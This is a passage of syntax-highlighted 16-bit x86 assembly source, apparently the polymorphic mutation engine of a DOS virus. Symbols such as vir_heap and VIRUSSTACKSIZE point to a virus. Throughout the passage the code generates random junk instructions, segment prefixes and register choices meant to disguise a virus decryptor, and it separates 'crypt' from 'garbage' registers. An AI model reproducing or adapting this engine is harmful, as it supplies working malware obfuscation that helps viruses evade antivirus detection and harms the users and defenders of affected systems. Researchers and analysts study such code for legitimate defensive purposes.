        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.lastgarble</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; then try again, we don't want two</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">                         </span><span class="sc1">; of the same sort in a row</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">force_not_branch_garble</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.lastgarble</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; else remember this one and process it</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">garble_table</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._engdata.reg0</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">R_M</span><span class="sc0">         </span><span class="sc1">; clear bottom 3 bits</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">                          </span><span class="sc1">; if mod = 0</span><span class="sc0">
</span><span class="sc1">;- encode two register instruction -- or reg und memory --------------------</span><span class="sc0">
</span><span class="sc1">;----- process M0D ---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">        </span><span class="sc1">; get random M0D</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">M0D</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; fill in the field</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; dl=M0D</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11b</span><span class="sc0">              </span><span class="sc1">; use two register ?</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc0">                      </span><span class="sc1">; if use memory, i.e. [bx+si]</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; change to byte data "byte sized"</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">                        </span><span class="sc1">; for not MOV AX,[0FFFFh]</span><span class="sc0">
</span><span class="sc1">;----- process Reg ---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_register</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000100b</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">                     </span><span class="sc1">; can we use any register as 1st ?</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">                        </span><span class="sc1">; yes! any! // for (test/cmp) operation</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.lastchoose</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG</span><span class="sc0">               </span><span class="sc1">; move register into the reg field</span><span class="sc0">
</span><span class="sc1">;----- process R/M ---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">        </span><span class="sc1">; get random R/M</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">R_M</span><span class="sc0">         </span><span class="sc1">; in memory access,</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.lastchoose</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">             </span><span class="sc1">;don't "mov ax,ax" etc</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">110b</span><span class="sc0">             </span><span class="sc1">; if (R/M = 6)</span><span class="sc0">
        </span><span class="sc5">PASS</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">M0D</span><span class="sc0">           </span><span class="sc1">; and MOD = 00</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; need two byte after instruction</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0">
                </span><span class="sc5">MASKA</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0010x110</span><span class="sc0">     </span><span class="sc1">; 26, 2E, 36, 3E - segment prefix</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">         </span><span class="sc1">;segcs | seges</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">DOELSE</span><span class="sc0">
</span><span class="sc1">;- encode one register instruction -------------- ! no memory ! ------------</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_register</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">              </span><span class="sc1">; no data bytes</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">                      </span><span class="sc1">; if shift, not, neg inctruction</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; assume byte</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; byte or word of data?</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">                 </span><span class="sc1">; continue if so</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; INC DX is better!!!</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_mov_imm</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0">    </span><span class="sc9">NE</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;word</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">less_1</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_AX</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01111110b</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
                </span><span class="sc5">MASKA</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00xxx10x</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">less_1</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_test</span><span class="sc0">
            </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc4">-</span><span class="sc2">0A8h</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">less_1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc1">;- store instruction -------------------------------------------------------</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; 1st register</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; write the instruction</span><span class="sc0">
</span><span class="sc1">;- store data bytes after instruction --------------------------------------</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">store_data_bytes_after_instruction</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; needs data bytes?</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                </span><span class="sc1">; check length of instruction</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; write the random byte</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;endp                    ;</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">choose_register</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_word_register</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; byte or word register?</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">                          </span><span class="sc1">; if word, we are okay</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_SP</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">AE</span><span class="sc0">                          </span><span class="sc1">; is a SI, DI, BP,</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; change xL to xH</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; make either byte or word register</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">choose_word_register</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1..3 - crypt   registers</span><span class="sc0">
</span><span class="sc1">; 4..6 - garbage registers</span><span class="sc0">
</span><span class="sc1">; 0..6 - all     registers</span><span class="sc0">
</span><span class="sc1">;                7654321</span><span class="sc0">
</span><span class="sc1">;useregs        01111111b</span><span class="sc0">
</span><span class="sc1">;                ÀÁÁÁÁÁÁÄÄÄ"1" - possible use reg6..reg0</span><span class="sc0">
</span><span class="sc1">;                DO</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">doo</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc5">engdata.useregs</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">            </span><span class="sc1">; get random number</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0"> </span><span class="sc1">; CF=0</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">doo</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._engdata.reg0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;ifd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;pub</span><span class="sc0">
</span><span class="sc5">protect_reg</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">doo</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">engdata.lastchoose</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">doo</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.lastchoose</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">setup_reg</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc0"> </span><span class="sc1">;[engdata.sourceptr]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.targetptr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">not_branch_garble_with_save_cx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">not_branch_garble</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0FFh</span><span class="sc0">           </span><span class="sc1">; encode JMP register</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">encode_push</span><span class="sc0">  </span><span class="sc1">;bx</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">choose_word_register</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">R_CX</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">BE</span><span class="sc0"> </span><span class="sc1">;te:R_AX or R_CX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_mov</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">push_any_sux1</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">push_any_sux</span><span class="sc0"> </span><span class="sc1">;al-register for push</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opPUSH_AX</span><span class="sc0">           </span><span class="sc1">;push sux</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">
</span><span class="sc1">;endp</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

